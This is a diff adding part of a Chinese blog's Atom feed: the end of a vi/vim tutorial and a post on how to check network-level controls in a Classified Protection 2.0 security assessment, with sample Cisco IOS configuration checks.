+<td style="text-align:center">q</td>
+<td style="text-align:center">quit</td>
+<td>退出当前窗口，如果是最后一个窗口，则关闭 vi</td>
+</tr>
+<tr>
+<td style="text-align:center">o</td>
+<td style="text-align:center">other</td>
+<td>关闭其他窗口</td>
+</tr>
+</tbody>
+</table>
+<h4 id="2-调整窗口大小">2) 调整窗口大小</h4>
+<blockquote>
+<p>分屏窗口都是基于 <code>CTRL + W</code> 这个快捷键的，<code>w</code> 对应的英文单词是 <code>window</code></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">英文</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">+</td>
+<td style="text-align:center"></td>
+<td>增加窗口高度</td>
+</tr>
+<tr>
+<td style="text-align:center">-</td>
+<td style="text-align:center"></td>
+<td>减少窗口高度</td>
+</tr>
+<tr>
+<td style="text-align:center">&gt;</td>
+<td style="text-align:center"></td>
+<td>增加窗口宽度</td>
+</tr>
+<tr>
+<td style="text-align:center">&lt;</td>
+<td style="text-align:center"></td>
+<td>减少窗口宽度</td>
+</tr>
+<tr>
+<td style="text-align:center">=</td>
+<td style="text-align:center"></td>
+<td>等分窗口大小</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>调整窗口宽高的命令可以和数字连用，例如：<code>5 CTRL + W +</code> 连续 5 次增加高度</p>
+</blockquote>
+<h2 id="06-常用命令速查图">06. 常用命令速查图</h2>
+<figure data-type="image" tabindex="6"><img src="https://MaHule.github.io/post-images/vi/vim.png" alt="vi" loading="lazy"></figure>
+<h3 id="vimrc">vimrc</h3>
+<ul>
+<li><code>vimrc</code> 是 <code>vim</code> 的配置文件，可以设置 vim 的配置，包括：<strong>热键</strong>、<strong>配色</strong>、<strong>语法高亮</strong>、<strong>插件</strong> 等</li>
+<li><code>Linux</code> 中 <code>vimrc</code> 有两个位置，<strong>家目录下的配置文件优先级更高</strong></li>
+</ul>
+<pre><code>/etc/vim/vimrc
+~/.vimrc
+</code></pre>
+<ul>
+<li>常用的插件有：
+<ul>
+<li>代码补全</li>
+<li>代码折叠</li>
+<li>搜索</li>
+<li>Git 集成</li>
+<li>……</li>
+</ul>
+</li>
+<li>网上有很多高手已经配置好的针对 <code>python</code> 开发的 <code>vimrc</code> 文件，可以下载过来直接使用，或者等大家多 <code>Linux</code> 比较熟悉后，再行学习！</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[网络安全测评]]></title>
+        <id>https://MaHule.github.io/wang-luo-an-quan-ce-ping/</id>
+        <link href="https://MaHule.github.io/wang-luo-an-quan-ce-ping/">
+        </link>
+        <updated>2020-04-10T07:08:04.000Z</updated>
+        <summary type="html"><![CDATA[<p>介绍等级保护2.0中在网络层面上的安全测评需要从哪些方面着手。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>介绍等级保护2.0中在网络层面上的安全测评需要从哪些方面着手。</p>
+<!-- more -->
+<h3 id="01标准概述">01.标准概述</h3>
+<blockquote>
+<p>基本要求中网络安全的控制点与要求项各级分布</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>控制点</th>
+<th>要求项</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第一级</td>
+<td>3</td>
+<td>9</td>
+</tr>
+<tr>
+<td>第二级</td>
+<td>6</td>
+<td>18</td>
+</tr>
+<tr>
+<td>第三级</td>
+<td>7</td>
+<td>33</td>
+</tr>
+<tr>
+<td>第四级</td>
+<td>7</td>
+<td>32</td>
+</tr>
+</tbody>
+</table>
+<p>等级保护基本要求三级网络安全方面涵盖哪些内容？</p>
+<p>涉及<strong>结构安全，安全审计，边界完整性检查，入侵防范，恶意代码防范，访问控制，网络设备</strong>等方面</p>
+<h3 id="02-检查范围">02. 检查范围</h3>
+<ul>
+<li>**理解标准：**理解标准中涉及网络部分的每项基本要求</li>
+<li>**明确目的：**检查的最终目的是判断该信息系统的网络安全综合防护能力，如抗攻击能力，防病毒能力等等，不是单一的设备检查</li>
+<li>**分阶段进行：**共划分为4个阶段，测评准备，方案编制，现场测评，分析及报告编制</li>
+<li><strong>确定检查范围，细化检查项：</strong> 1.通过前期的调研获取被测系统的<strong>网络结构拓扑</strong>，外连线路，网络设备，安全设备等信息   2.根据调研结果，进行初步分析判断   3.明确边界设备，核心设备及其他重要设备，确定检查范围</li>
+<li><strong>注意事项：</strong> 1. 考虑设备的重要程度可以采用抽样的方式   2.不能出现漏洞，避免出现脆弱点。 3.最终需要在测评方案中与用户明确检查范围 -- 网络设备，安全设备列表</li>
+</ul>
+<h3 id="03-检查内容">03. 检查内容</h3>
+<ul>
+<li>以三级为例，按照基本要求7个控制点33个要求项进行检查</li>
+</ul>
+<ol>
+<li>结构安全              （7项）</li>
+<li>访问控制              （8项）</li>
+<li>安全审计              （4项）</li>
+<li>边界完整性检查   （2项）</li>
+<li>入侵防范               （2项）</li>
+<li>恶意代码防范       （2项）</li>
+<li>网络设备防护       （8项）</li>
+</ol>
+<h4 id="1结构安全">1.结构安全</h4>
+<blockquote>
+<p>结构安全是网络安全测评检查的重点，网络结构是否合理直接关系到信息系统的整体安全</p>
+</blockquote>
+<h5 id="a应该保证主要网络设备的业务处理能力具备冗余空间满足业务高峰期需要">a）应该保证主要网络设备的业务处理能力具备冗余空间，满足业务高峰期需要</h5>
+<ol>
+<li>为保证信息系统的可用性，主要网络设备的业务处理能力应该具备冗余空间</li>
+<li>检查方法</li>
+</ol>
+<ul>
+<li>访谈网络管理员，询问主要网络设备的性能及业务高峰流量</li>
+<li>访问网络管理员，询问采用何种手段对网络设备进行监控</li>
+</ul>
+<h5 id="b-应保证网络各个部分的带宽满足业务高峰期需要">b) 应保证网络各个部分的带宽满足业务高峰期需要</h5>
+<ol>
+<li>对网络各个部分进行分配带宽，从而保证在业务高峰期业务服务的连续性</li>
+<li>检查方法</li>
+</ol>
+<ul>
+<li>询问当前网络各部分的带宽是否满足业务高峰期需要</li>
+<li>如无法满足，则需要进行带宽分配。检查主要网络设备是否进行带宽分配</li>
+</ul>
+<h5 id="c应在业务终端与业务服务器之间进行路由控制建立安全的访问路径">c）应在业务终端与业务服务器之间进行路由控制建立安全的访问路径</h5>
+<ol>
+<li>静态路由是指网络管理员手工配置的路由信息。动态路由是指路由器能够自动建立自己的路由表</li>
+<li>路由器之间的路由信息交换是基于路由协议实现的</li>
+<li>使用动态路由协议应配置使用路由协议认证功能，保证网络路由安全</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>检查边界设备和主要网络设备，查看是否进行了路由控制建立安全的访问控制</li>
+<li>以Cisco ios为例，输入命令：show running-config 检查配置文件中应当存在类似如下配置项</li>
+</ul>
+<pre><code>ip route 192.168.1.0  255.255.255.0  192.168.1.193
+route ospf 100 (动态)
+ip ospf message-digest-key 1 md5 7  XXXXX(认证码)
+</code></pre>
+<h5 id="d应绘制与当前运行情况相符的网络拓扑结构图">d）应绘制与当前运行情况相符的网络拓扑结构图</h5>
+<ol>
+<li>为了方便网络管理，应绘制与当前运行情况相符的网络拓扑结构图。当网络拓扑结构发生改变，及时更新</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>检查网络拓扑，查看其与当前运行情况</li>
+</ul>
+<h5 id="e-应根据各部门-的工作职能重要性和所涉及信息的重要程度等因素划分不同的子网或网段并按照方便管理和控制的原则为各子网网段分配地址段">e) 应根据各部门 的工作职能，重要性和所涉及信息的重要程度等因素，划分不同的子网或网段，并按照方便管理和控制的原则为各子网，网段分配地址段；</h5>
+<ol>
+<li>根据实际情况和区域安全防护要求，应在主要网络设备上进行VLAN划分或子网划分</li>
+<li>不同VLAN内的报文在传输时是相互隔离的。如果不同VLAN要进行通信，则需要通过路由器或三层交换机等三层设备实现</li>
+</ol>
+<h5 id="f应避免将重要网段部署在网络边界处且直接连接外部信息系统重要网段与其它网段之间采取可靠的技术隔离手段">f）应避免将重要网段部署在网络边界处且直接连接外部信息系统，重要网段与其它网段之间采取可靠的技术隔离手段；</h5>
+<ol>
+<li>
+<p>为保证信息系统的安全，应避免将重要网段部署在网络边界处且直接连接外部信息系统，防止来自外部信息系统的攻击。</p>
+</li>
+<li>
+<p>在重要网段和其它网段之间配置安全策略进行访问控制</p>
+</li>
+<li>
+<p>检查方法：</p>
+</li>
+</ol>
+<ul>
+<li>检查网络拓扑结构，查看是否将重要网段部署在网络边界处，重要网段和其它网段之间是否配置安全策略进行访问控制</li>
+</ul>
+<h5 id="g应按照对业务服务的重要次序来指定带宽分配优先级别保证在网络发生拥堵的时候优先保护重要主机">g）应按照对业务服务的重要次序来指定带宽分配优先级别，保证在网络发生拥堵的时候优先保护重要主机</h5>
+<ol>
+<li>为了保证重要业务服务的连续性，应按照对业务服务的重要次序来指定带宽分配优先级别，从而保证在网络发生拥堵的时候优先保护重要主机</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>访谈网络管理员，依据实际应用系统状况，是否进行了带宽优先级分配</li>
+</ul>
+<h4 id="2访问控制">2.访问控制</h4>
+<blockquote>
+<p>访问控制是网络测评检查中的核心部分，涉及到大部分网络设备，安全设备</p>
+</blockquote>
+<h5 id="a-应在网络边界部署访问控制设备启用访问控制功能">a) 应在网络边界部署访问控制设备，启用访问控制功能</h5>
+<ol>
+<li>在网络边界部署访问控制设备，防御来自其它网络的攻击，保护内部网络的安全。</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>检查网络拓扑结构，查看是否在网络边界处部署了访问控制设备，是否启用了访问控制功能</li>
+</ul>
+<h5 id="b-应能根据会话状态信息为数据流提供明确的允许拒绝访问的能力控制粒度为端口级">b) 应能根据会话状态信息为数据流提供明确的允许/拒绝访问的能力，控制粒度为端口级</h5>
+<ol>
+<li>在网络边界部署访问控制设备，配置的访问控制列表应有明确的源/目的地址，源/目的，协议及服务等。</li>
+</ol>
+<h5 id="c应对进出网络的信息内容进行过滤实现对应用层httpftptelnetsmtppop3等协议命令级的控制">c）应对进出网络的信息内容进行过滤，实现对应用层http，ftp，telnet，smtp，pop3等协议命令级的控制</h5>
+<ol>
+<li>对于一些常用的应用层协议，能够在访问控制设备上实现应用层协议命令级的控制和内容检查，从而增强访问控制力度</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>该测评项在防火墙，入侵防御系统上检查</li>
+<li>首先查看防火墙，入侵防御系统是否具有该功能，然后登录设备查看是否启用了相应的功能</li>
+</ul>
+<h5 id="d-应在会话处于非活跃一定时间或会话结束后终止网络连接">d) 应在会话处于非活跃一定时间或会话结束后终止网络连接</h5>
+<ol>
+<li>应在会话终止或长时间无响应的情况下终止网络连接，释放被占用网络资源，保证业务可以被正常访问</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>一般在防火墙检查</li>
+<li>登录防火墙，查看是否设置了会话连接超时，设置的超时时间是多少，判断是否合理</li>
+</ul>
+<h5 id="e应限制网络最大流量数及网络连接数">e）应限制网络最大流量数及网络连接数；</h5>
+<ol>
+<li>根据IP，端口，协议来限制应用数据流的最大流量，还可以根据IP地址来限制网络连接数，从而保证业务带宽不被占用，业务系统可以对外正常提供业务</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>一般在防火墙检查。访谈系统管理员，依据网络状况是否需要限制网络最大流量数及网络连接数</li>
+<li>登录设备查看是否设置了最大流量数和连接数，并做好记录</li>
+</ul>
+<h5 id="f重要网段应采取技术手段防止地址欺骗">f）重要网段应采取技术手段防止地址欺骗</h5>
+<ol>
+<li>地址欺骗在网络安全中比较重要的一个问题，这里的地址，可以是mac地址，也可以是IP地址。在关键设备上，采用IP/Mac地址绑定方式防止地址欺骗</li>
+<li>检查方法</li>
+</ol>
+<ul>
+<li>以CISCO IOS为例，输入show ip arp；检查配置文件中应当存在类似如下配置项：<code>arp 10.10.10.1 0000.e268.9980</code>  arpa</li>
+</ul>
+<h5 id="g-应按用户和系统之间的允许访问控制规则决定允许或拒绝用户对受控系统进行资源访问控制力度为单个用户">g) 应按用户和系统之间的允许访问控制规则，决定允许或拒绝用户对受控系统进行资源访问，控制力度为单个用户；</h5>
+<ol>
+<li>对于远程拨号用户，应在相关设备上提供用户认证功能。</li>
+<li>通过配置用户，用户组，并结合访问控制规则可以实现对认证成功的用户允许访问受控资源</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>登录相关设备查看是否对拨号用户进行身份认证，是否配置访问控制规则对认证成功的用户允许访问受控资源</li>
+</ul>
+<h5 id="h应限制具有拨号访问权限的用户数量">h）应限制具有拨号访问权限的用户数量</h5>
+<ol>
+<li>应限制通过远程采用拨号方式或通过其它方式连入系统内部的用户数量。</li>
+<li>检查方法：</li>
+</ol>
+<ul>
+<li>询问系统管理员，是否有远程拨号用户，采用什么方式接入系统，采用何种方式进行身份认证，具体用户数量有多少</li>
+</ul>
+<h4 id="3安全审计">3.安全审计</h4>
+<blockquote>
+<p>安全审计要对相关时间进行日志记录，还要求对形成的记录能够分析，形成报表</p>
+</blockquote>
+<h5 id="a对网络系统中的网络设备运行状况网络流量用户行为等进行日志记录">a）对网络系统中的网络设备运行状况，网络流量，用户行为等进行日志记录</h5>
+<h5 id="b审计记录应包括事件的日期和时间用户时间类型事件是否成功及其他与审计相关的信息">b）审计记录应包括：事件的日期和时间，用户，时间类型，事件是否成功及其他与审计相关的信息</h5>
+<h5 id="c应能够根据记录数据进行分析并生成审计报表">c）应能够根据记录数据进行分析，并生成审计报表</h5>
+<h5 id="d应对审计记录进行保护避免受到未预期的删除修改或覆盖">d）应对审计记录进行保护，避免受到未预期的删除，修改或覆盖</h5>
+<h4 id="4边界完整性检查">4.边界完整性检查</h4>
+<blockquote>
+<p>边界完整性检查主要检查在全网中对网络的连接状况进行监控，发现非法接入，非法外联是能够准确定位并能及时报警和阻断</p>
+</blockquote>
+<h5 id="a应能够对非授权设备私自联到内部网络的行为进行检查准确定出位置并对其进行有效阻隔">a）应能够对非授权设备私自联到内部网络的行为进行检查，准确定出位置，并对其进行有效阻隔</h5>
+<h5 id="b应能够对内部网络用户私自联到外部网络的行为进行检查准确定出位置并对其进行有效阻隔">b）应能够对内部网络用户私自联到外部网络的行为进行检查，准确定出位置，并对其进行有效阻隔</h5>
+<h4 id="5-入侵防范">5. 入侵防范</h4>
+<blockquote>
+<p>对入侵事件不仅能够检测，并能发出报警，对于入侵防御系统要求定期更新特征库，发现入侵后能够报警并阻断</p>
+</blockquote>
+<h5 id="a在网络边界处监视以下行为端口扫描强力攻击木马后门攻击拒绝服务攻击缓冲区溢出攻击ip碎片攻击和网络攻击">a）在网络边界处监视以下行为：端口扫描，强力攻击，木马后门攻击，拒绝服务攻击，缓冲区溢出攻击，IP碎片攻击和网络攻击</h5>
+<h5 id="b当检测到攻击行为时记录攻击源ip攻击类型攻击目的攻击时间在发生严重入侵事件时应提供报警">b）当检测到攻击行为时，记录攻击源IP，攻击类型，攻击目的，攻击时间，在发生严重入侵事件时应提供报警</h5>
+<h4 id="6恶意代码防范">6.恶意代码防范</h4>
+<blockquote>
+<p>恶意代码防范是综合性的多层次的，在网络边界处需要对恶意代码进行防范</p>
+</blockquote>
+<h5 id="a在网络边界处对恶意代码进行检测和清除">a）在网络边界处对恶意代码进行检测和清除</h5>
+<h5 id="b应维护恶意代码库的升级和检测系统的更新">b）应维护恶意代码库的升级和检测系统的更新</h5>
+<h4 id="7网络设备防护">7.网络设备防护</h4>
+<blockquote>
+<p>网络设备防护主要是对用户登录前后的行为进行控制，对网络设备的权限进行管理</p>
+</blockquote>
+<h5 id="a应对登录网络设备的用户进行身份级别">a）应对登录网络设备的用户进行身份级别</h5>
+<h5 id="b对网络设备的管理员登录地址进行限制">b）对网络设备的管理员登录地址进行限制</h5>
+<h5 id="c网络设备用户的标识应唯一">c）网络设备用户的标识应唯一</h5>
+<h5 id="d主要网络设备应对同一用户选择两种或两种以上组合的鉴别技术来进行身份鉴别">d）主要网络设备应对同一用户选择两种或两种以上组合的鉴别技术来进行身份鉴别</h5>
+<h5 id="e身份鉴别信息应具有不易被冒用的特点口令应有复杂度要求并定期更换">e）身份鉴别信息应具有不易被冒用的特点，口令应有复杂度要求并定期更换</h5>
+<h5 id="f应具有登录失败处理功能可采取结束会话限制非法登录次数和当网络登录连接超时时自动退出等措施">f）应具有登录失败处理功能，可采取结束会话，限制非法登录次数和当网络登录连接超时时自动退出等措施</h5>
+<h5 id="g当对网络设备进行远程管理时应采取必要措施防止鉴别信息在网络传输过程中被窃取">g）当对网络设备进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃取</h5>
+<h5 id="h实现设备特权用户的权限分离">h）实现设备特权用户的权限分离</h5>
+<h4 id="8检查内容备份和回复">8.检查内容（备份和回复）</h4>
+<blockquote>
+<p>备份和恢复关注的是网络设备，安全设备的配置数据的安全保护</p>
+</blockquote>
+<h5 id="a应提供本地数据库备份与恢复功能完全数据备份至少每天一次备份介质场外存放">a）应提供本地数据库备份与恢复功能，完全数据备份至少每天一次，备份介质场外存放</h5>
+<h5 id="b提供异地数据备份功能利用通信网络将关键数据定时批量传送至备用场地">b）提供异地数据备份功能，利用通信网络将关键数据定时批量传送至备用场地</h5>
+<h5 id="c采用冗余技术设计网络拓扑结构避免关键节点存在单点故障">c）采用冗余技术设计网络拓扑结构，避免关键节点存在单点故障</h5>
+<h5 id="d应提供主要网络设备通信线路和数据处理系统的硬件冗余保证系统的高可用性">d）应提供主要网络设备，通信线路和数据处理系统的硬件冗余，保证系统的高可用性</h5>
+]]></content>
+    </entry>
+</feed>
